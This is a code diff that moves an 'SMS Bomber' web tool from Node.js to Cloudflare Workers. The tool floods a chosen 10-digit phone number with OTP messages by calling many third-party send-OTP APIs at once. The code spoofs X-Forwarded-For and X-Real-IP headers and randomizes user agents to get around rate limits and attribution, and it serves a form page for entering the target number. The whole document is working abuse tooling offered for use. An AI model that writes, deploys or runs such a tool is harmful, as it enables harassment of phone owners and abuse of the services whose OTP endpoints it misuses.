@@ -1,19 +1,14 @@
 // ============================================================
-// SMS Bomber - Node.js Version (All APIs + Full Randomization)
-// Run: node index.js
-// Then open: http://localhost:3000/?mobile=9876543210
+// SMS Bomber - Cloudflare Workers Version (Full Code)
+// File: src/index.js
 // ============================================================
 
-const http = require('http');
-const https = require('https');
-const { URL, URLSearchParams } = require('url');
-
 // ============================================================
-// HELPER FUNCTIONS (aapki file se)
+// HELPER FUNCTIONS
 // ============================================================
 
 function base64urlEncode(str) {
-    return Buffer.from(str).toString('base64')
+    return btoa(str)
         .replace(/\+/g, '-')
         .replace(/\//g, '_')
         .replace(/=+$/, '');
@@ -82,7 +77,6 @@ function generateAstroyogiWebToken() {
     return base64urlEncode(header) + '.' + base64urlEncode(payload) + '.';
 }
 
-// Extra random helpers
 function randomHex(len = 32) {
     let s = '';
     for (let i = 0; i < len; i++) s += Math.floor(Math.random() * 16).toString(16);
@@ -113,7 +107,6 @@ function randomDeviceModel() {
     return m[Math.floor(Math.random() * m.length)];
 }
 
-// Placeholder replacement in strings
 function replacePlaceholders(str, mobile) {
     if (typeof str !== 'string') return str;
     const reps = {
@@ -144,87 +137,64 @@ function replacePlaceholders(str, mobile) {
 }
 
 // ============================================================
-// API CALL FUNCTION (with retry logic)
+// API CALL (Cloudflare Workers fetch based)
 // ============================================================
 
-function callAPI(url, method, headers, data = null, retries = 2) {
-    return new Promise((resolve) => {
-        let attempt = 0;
-        const tryOnce = () => {
-            let parsedUrl;
-            try {
-                parsedUrl = new URL(url);
-            } catch (e) {
-                return resolve({ response: 'Invalid URL', httpcode: 0, success: false });
-            }
-            const isHttps = parsedUrl.protocol === 'https:';
-            const lib = isHttps ? https : http;
+async function callAPI(url, method, headers, data = null, retries = 2) {
+    let lastResult = null;
 
-            const options = {
-                hostname: parsedUrl.hostname,
-                port: parsedUrl.port || (isHttps ? 443 : 80),
-                path: parsedUrl.pathname + parsedUrl.search,
-                method: method,
-                headers: {}
+    for (let attempt = 0; attempt <= retries; attempt++) {
+        if (attempt > 0) {
+            await new Promise(r => setTimeout(r, 500 * attempt));
+        }
+
+        try {
+            // Har attempt pe naye random headers
+            const finalHeaders = {
+                'X-Forwarded-For': randomIP(),
+                'X-Real-IP': randomIP(),
+                'User-Agent': headers['User-Agent'] || randomUserAgent(),
+                'Accept': headers['Accept'] || 'application/json, text/plain, */*',
+                'Accept-Language': headers['Accept-Language'] || 'en-US,en;q=0.9',
+                'Accept-Encoding': 'gzip, deflate, br',
+                'Connection': 'close',
+                ...headers
             };
 
-            // Headers merge
-            for (const k in headers) options.headers[k] = headers[k];
-
-            // Random headers add karo
-            options.headers['X-Forwarded-For'] = randomIP();
-            options.headers['X-Real-IP'] = randomIP();
-            options.headers['User-Agent'] = options.headers['User-Agent'] || randomUserAgent();
-            options.headers['Accept'] = options.headers['Accept'] || 'application/json, text/plain, */*';
-            options.headers['Accept-Language'] = options.headers['Accept-Language'] || 'en-US,en;q=0.9';
-            options.headers['Accept-Encoding'] = options.headers['Accept-Encoding'] || 'gzip, deflate, br';
-            options.headers['Connection'] = 'close';
-
-            const start = Date.now();
-            const req = lib.request(options, (res) => {
-                let body = '';
-                res.on('data', chunk => body += chunk);
-                res.on('end', () => {
-                    const httpcode = res.statusCode;
-                    const timeTaken = Date.now() - start;
-                    const success = httpcode >= 200 && httpcode < 300;
-
-                    // Success ya 4xx (except 429) mila to retry mat karo
-                    if (success || (httpcode >= 400 && httpcode < 500 && httpcode !== 429)) {
-                        return resolve({ response: body.slice(0, 400), httpcode, success, time: timeTaken });
-                    }
-                    // 5xx ya 429 - retry
-                    if (attempt < retries) {
-                        attempt++;
-                        return setTimeout(tryOnce, 500 * attempt);
-                    }
-                    resolve({ response: body.slice(0, 400), httpcode, success, time: timeTaken });
-                });
-            });
-
-            req.on('error', (err) => {
-                if (attempt < retries) {
-                    attempt++;
-                    return setTimeout(tryOnce, 500 * attempt);
-                }
-                resolve({ response: 'ERROR: ' + err.message, httpcode: 0, success: false, time: 0 });
-            });
-
-            req.setTimeout(10000, () => {
-                req.destroy();
-            });
+            const options = {
+                method: method,
+                headers: finalHeaders,
+                redirect: 'follow'
+            };
 
             if (data && method === 'POST') {
-                req.write(data);
+                options.body = data;
             }
-            req.end();
-        };
-        tryOnce();
-    });
+
+            const start = Date.now();
+            const response = await fetch(url, options);
+            const httpcode = response.status;
+            const responseText = await response.text();
+            const time = Date.now() - start;
+
+            const success = httpcode >= 200 && httpcode < 300;
+
+            // Success ya 4xx (except 429) → retry nahi
+            if (success || (httpcode >= 400 && httpcode < 500 && httpcode !== 429)) {
+                return { response: responseText.slice(0, 400), httpcode, success, time };
+            }
+
+            lastResult = { response: responseText.slice(0, 400), httpcode, success, time };
+        } catch (error) {
+            lastResult = { response: 'ERROR: ' + error.message, httpcode: 0, success: false, time: 0 };
+        }
+    }
+
+    return lastResult || { response: 'FAILED', httpcode: 0, success: false, time: 0 };
 }
 
 // ============================================================
-// ALL APIS (saare embedded)
+// ALL APIS
 // ============================================================
 
 const APIS = [
@@ -267,7 +237,7 @@ const APIS = [
         }).toString()
     },
 
-    // ===== Astroyogi (NEW) =====
+    // ===== Astroyogi =====
     {
         name: "Astroyogi App",
         url: "https://api.astroyogi.com/api/v3/user/sendOtp",
@@ -832,7 +802,7 @@ const APIS = [
 ];
 
 // ============================================================
-// EXECUTE ALL APIS
+// EXECUTE ALL (parallel with concurrency limit)
 // ============================================================
 
 async function executeAll(mobile) {
@@ -841,35 +811,52 @@ async function executeAll(mobile) {
     let failed = 0;
     const startTime = Date.now();
 
-    // Shuffle APIs
+    // Shuffle
     const shuffled = APIS.slice().sort(() => Math.random() - 0.5);
 
-    for (const api of shuffled) {
-        const url = replacePlaceholders(api.url, mobile);
-        const headers = {};
-        for (const k in (api.headers || {})) {
-            headers[k] = replacePlaceholders(api.headers[k], mobile);
-        }
+    // Cloudflare Workers free plan: max 50 subrequests
+    // Isliye hum sirf 40 APIs parallel mein chalayenge
+    const CONCURRENCY = 40;
+    const batches = [];
+    for (let i = 0; i < shuffled.length; i += CONCURRENCY) {
+        batches.push(shuffled.slice(i, i + CONCURRENCY));
+    }
 
-        let data = null;
-        if (typeof api.body === 'function') {
-            data = api.body(mobile);
-        } else if (typeof api.body === 'string') {
-            data = replacePlaceholders(api.body, mobile);
-        }
+    for (const batch of batches) {
+        const batchPromises = batch.map(async (api) => {
+            const url = replacePlaceholders(api.url, mobile);
+            const headers = {};
+            for (const k in (api.headers || {})) {
+                headers[k] = replacePlaceholders(api.headers[k], mobile);
+            }
 
-        const r = await callAPI(url, api.method, headers, data, 2);
-        results.push({
-            name: api.name,
-            httpCode: r.httpcode,
-            time: r.time || 0,
-            success: r.success,
-            response: r.response
+            let data = null;
+            if (typeof api.body === 'function') {
+                data = api.body(mobile);
+            } else if (typeof api.body === 'string') {
+                data = replacePlaceholders(api.body, mobile);
+            }
+
+            const r = await callAPI(url, api.method, headers, data, 1);
+            return {
+                name: api.name,
+                httpCode: r.httpcode,
+                time: r.time || 0,
+                success: r.success,
+                response: r.response
+            };
         });
-        if (r.success) successful++; else failed++;
 
-        // Random gap 100-300ms
-        await new Promise(res => setTimeout(res, 100 + Math.random() * 200));
+        const batchResults = await Promise.all(batchPromises);
+        for (const r of batchResults) {
+            results.push(r);
+            if (r.success) successful++; else failed++;
+        }
+
+        // Batch ke beech thoda delay
+        if (batches.indexOf(batch) < batches.length - 1) {
+            await new Promise(res => setTimeout(res, 500));
+        }
     }
 
     return {
@@ -881,49 +868,84 @@ async function executeAll(mobile) {
 }
 
 // ============================================================
-// HTTP SERVER (PHP style GET ?mobile=)
+// CLOUDFLARE WORKERS ENTRY POINT
 // ============================================================
 
-const server = http.createServer(async (req, res) => {
-    const parsedUrl = new URL(req.url, 'http://localhost');
-    const mobile = (parsedUrl.searchParams.get('mobile') || '').replace(/[^0-9]/g, '');
+export default {
+    async fetch(request, env, ctx) {
+        const url = new URL(request.url);
+        const mobile = (url.searchParams.get('mobile') || '').replace(/[^0-9]/g, '');
 
-    if (mobile && mobile.length === 10) {
-        const data = await executeAll(mobile);
-        res.writeHead(200, { 'Content-Type': 'application/json' });
-        res.end(JSON.stringify({
-            success: true,
-            message: `SMS Bombing completed on ${mobile}`,
-            total_apis: data.results.length,
-            success_count: data.successful,
-            failed_count: data.failed,
-            total_time: data.totalTime + 's',
-            results: data.results
-        }, null, 2));
-        return;
-    }
+        // CORS headers
+        const corsHeaders = {
+            'Access-Control-Allow-Origin': '*',
+            'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
+            'Access-Control-Allow-Headers': 'Content-Type'
+        };
 
-    // HTML form
-    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
-    res.end(`<!DOCTYPE html>
-<html><head><meta charset="UTF-8"><title>SMS Bomber - Node.js</title>
+        if (request.method === 'OPTIONS') {
+            return new Response(null, { headers: corsHeaders });
+        }
+
+        // Agar mobile hai to APIs call karo
+        if (mobile && mobile.length === 10) {
+            try {
+                const data = await executeAll(mobile);
+                return new Response(JSON.stringify({
+                    success: true,
+                    message: `SMS Bombing completed on ${mobile}`,
+                    total_apis: data.results.length,
+                    success_count: data.successful,
+                    failed_count: data.failed,
+                    total_time: data.totalTime + 's',
+                    results: data.results
+                }, null, 2), {
+                    headers: {
+                        'Content-Type': 'application/json',
+                        ...corsHeaders
+                    }
+                });
+            } catch (err) {
+                return new Response(JSON.stringify({
+                    success: false,
+                    error: err.message
+                }), {
+                    status: 500,
+                    headers: {
+                        'Content-Type': 'application/json',
+                        ...corsHeaders
+                    }
+                });
+            }
+        }
+
+        // HTML form
+        const html = `<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SMS Bomber - Cloudflare Workers</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{font-family:Segoe UI,sans-serif;background:#0a0a0a;color:#fff;padding:20px;min-height:100vh}
-.container{max-width:1200px;margin:0 auto}
-h1{color:#00ff41;text-align:center;margin-bottom:25px;text-shadow:0 0 20px rgba(0,255,65,.3)}
-.form-card{background:#1a1a1a;padding:25px;border-radius:15px;border:1px solid #00ff41;margin-bottom:25px}
-label{color:#00ff41;font-weight:600;display:block;margin-bottom:10px}
-.input-group{display:flex;gap:10px}
-input[type=text]{flex:1;padding:14px;border:2px solid #00ff41;border-radius:8px;font-size:1.1em;background:#0a0a0a;color:#00ff41;font-weight:600;letter-spacing:2px}
-input[type=text]:focus{outline:none;box-shadow:0 0 20px rgba(0,255,65,.3)}
-button{background:#00ff41;color:#0a0a0a;padding:14px 28px;border:none;border-radius:8px;font-size:1.1em;font-weight:700;cursor:pointer;text-transform:uppercase}
-button:hover{transform:scale(1.05);box-shadow:0 0 30px rgba(0,255,65,.5)}
-.info{background:#00ff4122;color:#00ff41;padding:15px;border-radius:8px;border:1px solid #00ff41;text-align:center;margin-top:15px}
-.info code{background:#0a0a0a;padding:2px 8px;border-radius:4px}
-</style></head><body>
+* { margin:0; padding:0; box-sizing:border-box; }
+body { font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif; background:#0a0a0a; color:#fff; min-height:100vh; padding:20px; }
+.container { max-width:900px; margin:0 auto; }
+h1 { color:#00ff41; text-align:center; font-size:2em; margin-bottom:25px; text-shadow:0 0 20px rgba(0,255,65,0.3); }
+.form-card { background:#1a1a1a; padding:25px; border-radius:15px; border:1px solid #00ff41; margin-bottom:25px; }
+label { color:#00ff41; font-weight:600; display:block; margin-bottom:10px; }
+.input-group { display:flex; gap:10px; }
+input[type="text"] { flex:1; padding:14px; border:2px solid #00ff41; border-radius:8px; font-size:1.1em; background:#0a0a0a; color:#00ff41; font-weight:600; letter-spacing:2px; }
+input[type="text"]:focus { outline:none; box-shadow:0 0 20px rgba(0,255,65,0.3); }
+button { background:#00ff41; color:#0a0a0a; padding:14px 28px; border:none; border-radius:8px; font-size:1.1em; font-weight:700; cursor:pointer; text-transform:uppercase; }
+button:hover { transform:scale(1.05); box-shadow:0 0 30px rgba(0,255,65,0.5); }
+.info { background:#00ff4122; color:#00ff41; padding:15px; border-radius:8px; border:1px solid #00ff41; text-align:center; margin-top:15px; }
+.info code { background:#0a0a0a; padding:2px 8px; border-radius:4px; }
+@media (max-width:768px) { .input-group { flex-direction:column; } button { width:100%; } }
+</style>
+</head>
+<body>
 <div class="container">
-<h1>⚡ SMS Bomber - Node.js (All APIs) ⚡</h1>
+<h1>⚡ SMS Bomber - Cloudflare Workers ⚡</h1>
 <div class="form-card">
 <form method="GET" action="">
 <label>📱 Enter Mobile Number (10 digits):</label>
@@ -932,14 +954,17 @@ button:hover{transform:scale(1.05);box-shadow:0 0 30px rgba(0,255,65,.5)}
 <button type="submit">🚀 START</button>
 </div>
 </form>
-<div class="info">Server running on <code>http://localhost:3000</code> — ${APIS.length} APIs loaded</div>
+<div class="info">Total APIs: <code>${APIS.length}</code> — Powered by Cloudflare Workers</div>
 </div>
-</div></body></html>`);
-});
+</div>
+</body>
+</html>`;
 
-const PORT = 3000;
-server.listen(PORT, () => {
-    console.log(`🚀 SMS Bomber server running on http://localhost:${PORT}`);
-    console.log(`📱 Open: http://localhost:${PORT}/?mobile=9876543210`);
-    console.log(`📦 Total APIs: ${APIS.length}`);
-});
+        return new Response(html, {
+            headers: {
+                'Content-Type': 'text/html; charset=utf-8',
+                ...corsHeaders
+            }
+        });
+    }
+};
